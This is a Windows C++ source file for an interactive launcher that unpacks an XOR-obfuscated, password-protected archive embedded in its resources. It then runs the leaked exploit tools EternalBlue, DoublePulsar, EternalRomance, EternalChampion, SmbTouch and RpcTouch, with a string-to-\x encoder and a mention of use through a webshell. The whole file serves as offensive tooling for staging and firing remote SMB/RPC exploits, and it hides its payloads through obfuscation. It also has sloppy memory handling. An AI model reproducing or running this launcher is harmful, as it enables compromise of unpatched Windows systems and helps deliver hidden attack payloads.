#pragma once
//#include "PE.h"
//#include "pack.h"
//#include "debug.h"
#include "def.h"

BOOL WINAPI ConsoleHandler(DWORD CEvent)
{	
	switch(CEvent)
	{	
	case CTRL_C_EVENT:
		StopThis=true;
		break;
	}
	return TRUE;
}

void DeleteDirectionary()
{
	Sleep(50);
	char*path=new char[4096*2];memset(path,0,sizeof(path));
	GetModuleFileName(NULL,path,MAX_PATH);PathRemoveFileSpec(path);
	strcat(path,"\\");strcat(path,UnpackDirectionary);
	
	WIN32_FIND_DATA finddata;
    HANDLE hfind;
    char * pdir;
	
    pdir=new char[strlen(path)+5];
    strcpy(pdir,path);
    if(path[strlen(path)-1]!='\\')
        strcat(pdir,"\\*.*");
    else
        strcat(pdir,"*.*");
	
    hfind=FindFirstFile(pdir,&finddata);
    if(hfind==INVALID_HANDLE_VALUE)
    {
		printf("FindFirstFile() Failed! (%d)\n",GetLastError());
		return;
	}
	
    delete []pdir;
    do
    {
        pdir=new char[strlen(path)+strlen(finddata.cFileName)+2];
        sprintf(pdir,"%s\\%s",path,finddata.cFileName);
        if(strcmp(finddata.cFileName,".")==0
            ||strcmp(finddata.cFileName,"..")==0)
        {
            RemoveDirectory(pdir);
            continue;
        }
		
        if((finddata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)==0)
            DeleteFile(pdir);
        /*else
            DeleteDir(pdir);*/
		//There is no dir in 'datas'
        delete []pdir;
    }while(FindNextFile(hfind,&finddata));

	CloseHandle(hfind);
	Sleep(50);

	printf("Remove Directionary SUCCESSFULLY !\n");

}

int main(int argc,char**argv)
{
	if(argc>=2)
	{
		BkArgc=argc-1;BkArgv=argv;
		IsReadFromArgv=true;
		printf("Use the support to webshell, read from argv.\n");
	}else if(SetConsoleCtrlHandler((PHANDLER_ROUTINE)ConsoleHandler,TRUE)==FALSE);;
	InitParam();
	char input[512];char*p=NULL;
	while(true)
	{
		p=NULL;
		printf("EE > ");
		memset(input,0,sizeof(input));
		/*gets(input);*/ ReadThisStr(&input[0],sizeof(input)-1,true);
		if(!stricmp(input,"smbtouch"))
			p=LoadParam(SmbTouchFileName,SmbTouchPN,SmbTouchP);
		else if(!stricmp(input,"rpctouch"))
			p=LoadParam(RpcTouchFileName,RpcTouchPN,RpcTouchP);
		else if(!stricmp(input,"eternalblue"))
			p=LoadParam(EternalBlueFileName,EternalBluePN,EternalBlueP);
		else if(!stricmp(input,"doublepulsar"))
			p=LoadParam(DoublePulsarFileName,DoublePulsarPN,DoublePulsarP);
		else if(!stricmp(input,"eternalromance"))
			p=LoadParam(EternalRomanceFileName,EternalRomancePN,EternalRomanceP);
		else if(!stricmp(input,"eternalchampion"))
			p=LoadParam(EternalChampionFileName,EternalChampionPN,EternalChampionP);
		else if(!stricmp(input,"exit")){DeleteDirectionary();/*ExitProcess(0);*/exit(0);}
		else if(!stricmp(input,"clear") || !stricmp(input,"delete")){DeleteDirectionary();}
		else if(!stricmp(input,"__debug_pack"))
		{
			char*path=new char[4096*2];memset(path,0,sizeof(path));
			GetModuleFileName(NULL,path,MAX_PATH);PathRemoveFileSpec(path);
			strcat(path,"\\pack.zip");
			HZIP hz=CreateZip(path,UnpackPassowrd);
			path[strlen(path)-9]='\0';strcat(path,"\\datas");
			WIN32_FIND_DATA finddata;
			HANDLE hfind;
			char * pdir;
			pdir=new char[strlen(path)+5];
			strcpy(pdir,path);strcat(pdir,"\\*.*");
			ZipAddFolder(hz,"datas");
			hfind=FindFirstFile(pdir,&finddata);
			delete []pdir;
			do
			{
				if(strcmp(finddata.cFileName,".")==0||strcmp(finddata.cFileName,"..")==0)
					continue;
				pdir=new char[strlen(path)+strlen(finddata.cFileName)+2];
				sprintf(pdir,"%s\\%s",path,finddata.cFileName);
				if((finddata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)==0)
				{
					char*p=new char[strlen(finddata.cFileName)+strlen("datas\\")+1];
					sprintf(p,"datas\\%s",finddata.cFileName);
					ZipAdd(hz,p,pdir);
					delete []p;
				}
				delete []pdir;
			}while(FindNextFile(hfind,&finddata));
			CloseZip(hz);
		}
		else if(!stricmp(input,"__debug_pack_write"))
		{
			char*path=new char[4096*2];memset(path,0,sizeof(path));
			GetModuleFileName(NULL,path,MAX_PATH);PathRemoveFileSpec(path);
			strcat(path,"\\pack.zip");
			HANDLE h=CreateFile(path,GENERIC_ALL,0,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
			delete[]path;
			if(h==INVALID_HANDLE_VALUE){printf("F A CreateFile()\n");continue;}
			DWORD fileSize=GetFileSize(h,NULL);
			if(fileSize==0xFFFFFFFF){printf("F A GetFileSize()\n");continue;}
			if(SetFilePointer(h,0,NULL,FILE_BEGIN)==-1){printf("F A SetFilePointer()\n");continue;}
			printf("%ld\n",fileSize);
			DWORD dwWrote,dwRead;char nChar;
			for(DWORD dwNow=0;dwNow<fileSize;dwNow+=1)
			{
				if(!(dwNow%2==0 || dwNow%7==0 && dwNow%13!=0))continue;
				if(SetFilePointer(h,dwNow,NULL,FILE_BEGIN)==-1){printf("F A SetFilePointer(%ld)\n",dwNow);break;}
				if(!ReadFile(h,&nChar,1,&dwRead,NULL) || dwRead!=1){printf("F A ReadFile(%ld)\n",dwNow);break;}
				if(dwNow%2==0 || dwNow%7==0 && dwNow%13!=0)
					nChar^=UnpackCodePassword;
				if(SetFilePointer(h,dwNow,NULL,FILE_BEGIN)==-1){printf("F A SetFilePointer(%ld)\n",dwNow);break;}
				if(!WriteFile(h,&nChar,1,&dwWrote,NULL) || dwWrote!=1){printf("F A WriteFile(%ld)\n",dwNow);break;}
			}
			CloseHandle(h);
		}
		else if(!stricmp(input,"unpack") || !stricmp(input,"unzip"))
		{
			bool nSuc=true;
			HZIP hz;HRSRC hrsrc;
__try
{
			HINSTANCE hInstance=GetModuleHandle(NULL);
			if(hInstance==NULL)
			{
				printf("GetModuleHandle() failed. (%d)\n",GetLastError());
				nSuc=false;
				__leave;
			}

			hrsrc = FindResource(hInstance,MAKEINTRESOURCE(IDR_RT_RCDATA1),"RT_RCDATA");
			if(hrsrc==NULL)
			{
				printf("Couldn't FindResource() !\n");
				nSuc=false;
				__leave;
			}
			HANDLE hglob = LoadResource(hInstance,hrsrc);
			void *zipbuf = LockResource(hglob);
			unsigned int ziplen = SizeofResource(hInstance,hrsrc);

			printf("%ld\n",ziplen);
			char*czipbuf=(char*)zipbuf;
			for(DWORD dwNow=0;dwNow<ziplen;dwNow+=1)
			{
				if(!(dwNow%2==0 || dwNow%7==0 && dwNow%13!=0))continue;
				czipbuf[dwNow]^=UnpackCodePassword;
			}

			hz = OpenZip(zipbuf, ziplen, UnpackPassowrd);
			if(hz==0)
			{
				printf("OpenZip() failed !\n");
				nSuc=false;
				__leave;
			}
			int hret;
			ZIPENTRY ze;hret=GetZipItem(hz,-1,&ze);int numitems=ze.index;
			if(hret!=ZR_OK)
			{
				printf("GetZipItem() for numbers failed! (num->%d)\n",numitems);
				nSuc=false;
				__leave;
			}
			printf("Got %d files!\n",numitems);
			for (int zi=0; zi<numitems && nSuc; zi++)
			{
				ZIPENTRY ze;hret=GetZipItem(hz,zi,&ze);
				if(hret!=ZR_OK)
				{
					printf("GetZipItem() for names failed!\n");
					nSuc=false;
					__leave;
				}
				hret=UnzipItem(hz,zi,ze.name);
				if(hret!=ZR_OK)
				{
					printf("UnzipItem() in '%s' failed!\n",ze.name);
					nSuc=false;
					__leave;
				}else printf("Unzipped '%s'(%ld bytes) successfully!\n",ze.name,ze.unc_size);
			}
}
__finally
{
			FreeResource(hrsrc);
			CloseZip(hz);
}
			if(!nSuc)
				DeleteDirectionary();
			else
				printf("Unpack successfully!\n");
		}
		else if(!stricmp(input,"convert"))
		{
			printf("Input the string: ");
			wchar_t*ss=new wchar_t[1024*4];
			wscanf(L"%ls",ss);
			for(int l=0;l<wcslen(ss);l++)
				printf("\\x%x",ss[l]);
			printf("\nEnd of string.\n");
			delete[]ss;
		}
		else {printf("Nothing here.\n");continue;}
		if(StopThis)
		{
			StopThis=false;
			printf("\n\n");
		}
		else 
				ExecuteProcess(p);

	}
	return 0;
}